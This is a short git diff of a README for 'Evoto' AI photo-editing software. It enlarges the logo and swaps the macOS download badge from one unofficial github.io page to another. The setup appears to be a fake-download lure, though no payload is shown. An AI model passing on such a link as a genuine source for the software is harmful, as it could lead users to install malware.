@@ -1,14 +1,14 @@
 # Evoto – AI Photo Editing Software
 
 <div align="center">  
-  <img src="https://images.g2crowd.com/uploads/product/image/social_landscape/social_landscape_9e0a360406b9da9b8f77d76daca90ecd/evoto.png" width="250" alt="Evoto Logo"/>  
+  <img src="https://images.g2crowd.com/uploads/product/image/social_landscape/social_landscape_9e0a360406b9da9b8f77d76daca90ecd/evoto.png" width="450" alt="Evoto Logo"/>  
 </div>  
 
 <br>  
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-applications-install.github.io/.github/Evoto)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://apps-pozdnyakov-software.github.io/.github/Evoto)  
 
 </div>  
 
